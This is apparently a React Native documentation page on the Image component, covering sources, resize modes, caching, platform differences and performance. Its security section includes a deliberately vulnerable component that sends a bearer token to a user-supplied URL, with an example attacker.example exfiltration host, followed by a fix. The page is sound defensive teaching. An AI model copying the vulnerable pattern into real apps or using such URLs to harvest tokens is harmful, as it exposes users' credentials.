---
title: Image
description: Loading local and remote images, resize modes, sizing rules, caching, and the deprecated ImageBackground replacement.
status: current
allow-banned: image-background
toolchain: cli
---

`Image` renders a bitmap from a bundled asset, a remote URL, a data URI or the device's file
system. It is a leaf component: in the 0.87 types its `children` prop is typed `never`, so you
cannot nest anything inside it.

Images are usually the largest single contributor to an app's memory use and to its scroll
jank, so the sizing and caching rules below matter more than the prop list.

## Why it exists / when to use it — and when NOT to

Use `Image` for photographs, avatars, illustrations and raster icons.

Do not use it when:

- **The asset is an icon or a shape.** Use `react-native-svg` (15.15.5) or an icon font. A
  vector scales to any density without shipping three PNGs, and it tints cleanly.
- **You need content on top of an image.** `Image` takes no children. Use a `View` with an
  absolutely positioned `Image` behind the content — see [Common patterns](#common-patterns).
- **You are rendering hundreds of remote images in a list.** Core `Image` works, but a
  dedicated caching library gives you disk-cache control and decode priority. Measure first;
  the core component with correct sizing handles more than people assume.

## Basic example

```tsx title=src/components/Avatar.tsx
import {Image, StyleSheet} from 'react-native';

type Props = {
  uri: string;
  size?: number;
};

export function Avatar({uri, size = 40}: Props) {
  return (
    <Image
      // A remote image has no intrinsic size until it loads, so the style must
      // supply one or the layout jumps when the bytes arrive.
      source={{uri}}
      style={[styles.avatar, {width: size, height: size, borderRadius: size / 2}]}
      accessibilityLabel="Profile photo"
    />
  );
}

const styles = StyleSheet.create({
  avatar: {backgroundColor: '#e5e7eb'},
});
```

## How it works

### Static assets versus remote sources

`source` accepts two shapes, and they behave differently.

A **static asset** is passed as `require('./logo.png')`. Metro resolves it at bundle time, so
the image has an intrinsic width and height and you may omit the style dimensions. The
`@2x`/`@3x` suffix convention selects the right density automatically.

A **remote or file source** is passed as `{uri: 'https://…'}`. It has no intrinsic size until
the response arrives, so **you must give it a width and a height in style**. Otherwise the
image renders at zero size, or the layout jumps when it loads.

```tsx title=Both source shapes
import {View, Image, StyleSheet} from 'react-native';

export function Sources() {
  return (
    <View style={styles.row}>
      {/* Static: Metro knows the size, so style dimensions are optional. */}
      <Image source={require('../../assets/logo.png')} />

      {/* Remote: size is mandatory. */}
      <Image source={{uri: 'https://example.com/photo.jpg'}} style={styles.remote} />
    </View>
  );
}

const styles = StyleSheet.create({
  row: {flexDirection: 'row', gap: 12},
  remote: {width: 120, height: 80},
});
```

`source` also accepts an **array** of `{uri, width, height, scale}` objects. The native side
picks the best match for the target size and the device's pixel density — the native
equivalent of `srcset`. There is also a web-style `srcSet` string prop if you prefer that
spelling.

### Resize modes

`resizeMode` decides how the image fills the box the style gives it.

| Mode | Behaviour |
| --- | --- |
| `'cover'` (default) | Scale uniformly so both dimensions are `>=` the box; crops the overflow. |
| `'contain'` | Scale uniformly so both dimensions are `<=` the box; letterboxes. |
| `'stretch'` | Scale each axis independently to fill the box; distorts. |
| `'repeat'` | Tile at natural size until the box is full. |
| `'center'` | Centre at natural size; crops if larger, does not scale up. |
| `'none'` | Draw at intrinsic size, no scaling. |

`objectFit` is available as a **style** property with the CSS spelling (`'cover'`, `'contain'`,
`'fill'`, `'scale-down'`, `'none'`). Pick one convention per codebase; mixing them makes
grep-based refactors miss half the call sites.

### Load lifecycle

Four callbacks fire in a fixed order: `onLoadStart`, then either `onLoad` (with the resolved
`source` dimensions and uri) or `onError` (with an `error` string), then `onLoadEnd` in both
cases. Put teardown in `onLoadEnd`, not in `onLoad`, or a failed image leaves your spinner
spinning forever.

```tsx title=src/components/RemoteImage.tsx
import {useState} from 'react';
import {View, Image, ActivityIndicator, StyleSheet} from 'react-native';
import type {ImageErrorEvent} from 'react-native';

export function RemoteImage({uri}: {uri: string}) {
  const [loading, setLoading] = useState(true);
  const [failed, setFailed] = useState(false);

  function handleError(event: ImageErrorEvent) {
    console.warn('image failed', event.nativeEvent.error);
    setFailed(true);
  }

  return (
    <View style={styles.host}>
      {failed ? null : (
        <Image
          source={{uri}}
          style={StyleSheet.absoluteFill}
          onLoadStart={() => setLoading(true)}
          onError={handleError}
          // onLoadEnd fires on success AND failure, so the spinner always stops.
          onLoadEnd={() => setLoading(false)}
        />
      )}
      {loading ? <ActivityIndicator style={StyleSheet.absoluteFill} /> : null}
    </View>
  );
}

const styles = StyleSheet.create({
  host: {width: 160, height: 120, backgroundColor: '#e5e7eb'},
});
```

### The static methods

`Image` carries a handful of statics that are easy to miss:

- `Image.prefetch(url)` downloads into the cache ahead of render. Returns a promise.
- `Image.queryCache(urls)` reports which of a list of urls are cached, and whether in
  `'memory'`, `'disk'` or `'disk/memory'`.
- `Image.getSize(uri)` and `Image.getSizeWithHeaders(uri, headers)` resolve the intrinsic
  dimensions before rendering — useful when you need to reserve an aspect-ratio-correct box.
- `Image.resolveAssetSource(source)` turns a `require`d asset into its resolved uri, width,
  height and scale.

```tsx title=Warming the cache before a screen transition
import {Image} from 'react-native';

export async function prefetchHeroImages(urls: ReadonlyArray<string>): Promise<void> {
  // Prefetch failures are not fatal — the image will just load normally later.
  await Promise.all(
    urls.map(url =>
      Image.prefetch(url).catch(() => {
        return false;
      }),
    ),
  );
}
```

## Platform differences

:::tabs
@tab iOS
- **Caching is controlled per source** via `cache` on the `{uri}` object: `'default'`,
  `'reload'`, `'force-cache'` or `'only-if-cached'`. These map onto `NSURLRequest` cache
  policies, so they respect HTTP cache headers rather than replacing them.
- **`defaultSource`** shows a bundled placeholder while the remote image loads. It is iOS-only.
- **`onProgress`** reports `loaded` / `total` bytes during a remote download. iOS only.
- **`onPartialLoad`** fires for progressive formats when a usable partial image is available.
- **`capInsets`** freezes the corners while stretching the centre — the nine-patch behaviour
  used for resizable button backgrounds.
- **`blurRadius`** needs a value greater than 5 to be visible on iOS.
@tab Android
- **There is no per-source `cache` policy.** The `cache` field on `{uri}` is honoured by the
  iOS networking stack; on Android caching is the image pipeline's job and is not controlled
  from the source object.
- **`loadingIndicatorSource`** is the Android counterpart to `defaultSource` — it shows a
  bundled image or spinner while loading.
- **`fadeDuration`** (default 300ms) controls the fade-in when an image appears. Set it to `0`
  in lists where the fade reads as flicker during fast scrolling.
- **`resizeMethod`** (default `'auto'`) decides how a large bitmap is reduced before decode:
  `'resize'` decodes at a smaller size and uses far less memory, `'scale'` decodes fully and
  scales on the GPU. `resizeMultiplier` (default 1.0) tunes the `'resize'` target.
- **`progressiveRenderingEnabled`** (default `false`) renders progressive JPEGs as they arrive.
:::

`resizeMethod` is the single most useful Android-only knob when a list of large photos causes
out-of-memory crashes on low-end devices. Decoding a 4000px JPEG into a 100px thumbnail costs
the same memory as the full image unless the pipeline is told to downsample.

## Common patterns

### Content on top of an image

> [!DEPRECATED] `ImageBackground` is deprecated in 0.87
> `ImageBackground` is still exported, but it is deprecated. The replacement is a `View` that
> contains an absolutely positioned `Image` plus your content. It is the same number of native
> views, it is explicit about stacking, and it does not depend on a component that is on its
> way out.

```tsx title=src/components/HeroCard.tsx
import {View, Text, Image, StyleSheet} from 'react-native';

export function HeroCard({uri, title}: {uri: string; title: string}) {
  return (
    <View style={styles.host}>
      <Image
        source={{uri}}
        style={StyleSheet.absoluteFill}
        resizeMode="cover"
        // Decorative: hide it from screen readers so the title is announced alone.
        accessibilityElementsHidden
        importantForAccessibility="no-hide-descendants"
      />
      <View style={styles.scrim} />
      <Text style={styles.title}>{title}</Text>
    </View>
  );
}

const styles = StyleSheet.create({
  host: {
    height: 180,
    borderRadius: 12,
    overflow: 'hidden',
    justifyContent: 'flex-end',
    padding: 16,
  },
  scrim: {...StyleSheet.absoluteFill, backgroundColor: 'rgba(0,0,0,0.35)'},
  title: {color: '#ffffff', fontSize: 20, fontWeight: '700'},
});
```

### Tinting a monochrome icon

`tintColor` recolours every non-transparent pixel. It is the reason you can ship one white PNG
and use it in both themes.

```tsx title=One asset, two themes
import {Image, useColorScheme} from 'react-native';

export function ThemedIcon() {
  const scheme = useColorScheme();
  return (
    <Image
      source={require('../../assets/chevron.png')}
      style={{width: 16, height: 16}}
      tintColor={scheme === 'dark' ? '#f9fafb' : '#111827'}
    />
  );
}
```

### Reserving space with `aspectRatio`

When you know the ratio but not the pixel size, `aspectRatio` keeps the layout stable and
avoids the content jump that a late-loading image causes.

```tsx title=A full-width image that never shifts the layout
import {Image, StyleSheet} from 'react-native';

export function WideImage({uri}: {uri: string}) {
  return <Image source={{uri}} style={styles.wide} resizeMode="cover" />;
}

const styles = StyleSheet.create({
  wide: {width: '100%', aspectRatio: 16 / 9, backgroundColor: '#e5e7eb'},
});
```

## Performance considerations

**Decoded size is what costs memory, not file size.** A 2MB JPEG at 4000x3000 decodes to
roughly 48MB of RGBA in memory regardless of how well it compressed. Serve images at the size
you display them, or downsample at decode time with Android's `resizeMethod="resize"`.

**Always give remote images an explicit size.** Without one the view is zero-sized until load,
then reflows the whole screen. `aspectRatio` plus a width is usually the right answer.

**`fadeDuration={0}` on Android in fast lists.** The default 300ms fade repeats for every
recycled row and reads as flicker.

**Prefetch off the critical path.** `Image.prefetch` during an idle moment — for instance after
the first screen has painted — makes the next screen feel instant. Do not prefetch a hundred
urls at mount; you will contend with the requests the current screen needs.

**Reuse the same `source` object identity where you can.** A new `{uri}` literal every render
is a new prop value. It usually still hits the cache, but it defeats `React.memo` on wrapper
components. Hoist it or memoise it in list rows.

**Watch out for `blurRadius` in scrolling content.** It is a per-frame filter on some paths;
pre-blur the asset instead when the blur is static.

## Security considerations

**Threat.** Image sources are URLs, and URLs in user-generated content are attacker-controlled.
Two concrete risks: exfiltration of auth headers to an attacker's host, and loading over plain
HTTP so a network attacker can swap the bytes.

**Exploit.** Suppose a profile record carries an `avatarUrl` supplied by the user, and your
code attaches an auth token so private avatars work:

```tsx title=Vulnerable — the token goes wherever the URL points
import {Image} from 'react-native';

export function UnsafeAvatar({avatarUrl, token}: {avatarUrl: string; token: string}) {
  return (
    <Image
      source={{uri: avatarUrl, headers: {Authorization: `Bearer ${token}`}}}
      style={{width: 40, height: 40}}
    />
  );
}
```

Set `avatarUrl` to `https://attacker.example/collect.png` and the device sends your bearer
token to the attacker's server in an ordinary GET request.

**Fix.** Validate the host against an allow-list before attaching credentials, and never attach
credentials to a URL you did not construct.

```tsx title=Fixed — allow-list the host before trusting it
import {Image} from 'react-native';

const ALLOWED_IMAGE_HOSTS = new Set(['images.example.com', 'cdn.example.com']);

export function isTrustedImageUrl(raw: string): boolean {
  try {
    const parsed = new URL(raw);
    // Require https AND an exact host match. Substring checks such as
    // endsWith('example.com') are defeated by 'example.com.attacker.net'.
    return parsed.protocol === 'https:' && ALLOWED_IMAGE_HOSTS.has(parsed.hostname);
  } catch {
    return false;
  }
}

export function SafeAvatar({avatarUrl, token}: {avatarUrl: string; token: string}) {
  const trusted = isTrustedImageUrl(avatarUrl);
  return (
    <Image
      source={
        trusted
          ? {uri: avatarUrl, headers: {Authorization: `Bearer ${token}`}}
          : require('../../assets/avatar-placeholder.png')
      }
      style={{width: 40, height: 40}}
    />
  );
}
```

**Verification.** Point a proxy such as `mitmproxy` at the simulator, set a profile's avatar URL
to a host you control, and confirm no request carrying the `Authorization` header leaves for
that host. On Android you can also confirm cleartext is blocked at the platform level by
checking that `android:usesCleartextTraffic` is not enabled in your merged manifest:

```bash
./gradlew :app:processReleaseManifest
grep -i usesCleartextTraffic android/app/build/intermediates/merged_manifests/release/AndroidManifest.xml
```

## Common mistakes

- **Rendering a remote image with no width/height.** It collapses to zero and you conclude the
  URL is broken. Static `require`d assets are the only ones with intrinsic size.
- **Putting children inside `Image`.** The prop is typed `never` in 0.87. Use a `View` with an
  absolutely positioned `Image` instead.
- **Reaching for `ImageBackground`.** It is deprecated in 0.87. The two-element replacement is
  shown above.
- **Using `resizeMode="contain"` and wondering why there are gaps.** `'contain'` letterboxes by
  definition. If you want the box filled, that is `'cover'`, which crops.
- **Shipping one huge PNG for every density.** Ship `@2x` and `@3x` variants, or an SVG.
  A 3x asset scaled down on a 1x device wastes memory on every device that loads it.
- **Assuming `cache: 'force-cache'` works on Android.** That field maps onto iOS URL loading
  policies. On Android, control caching with HTTP headers from your server.
- **Treating `onLoad` as "done".** A failed load never fires `onLoad`. Clean up in `onLoadEnd`.
- **Forgetting `accessibilityLabel` or `alt`.** An unlabelled image is announced as "image" and
  nothing else. A decorative image should be hidden from accessibility instead.

## Related topics

- [View](view.md) — the container used for the overlay pattern.
- [Image Performance](../performance/image-performance.md) — sizing, decoding and memory in depth.
- [FlatList](flatlist.md) — where image cost shows up first.
- [Fonts and Icons](../styling/fonts-and-icons.md) — when a vector beats a bitmap.
- [Units and Density](../styling/units-and-density.md) — what `@2x` and `@3x` actually mean.
- [Network Security Config](../security/network-security-config.md) — blocking cleartext on Android.
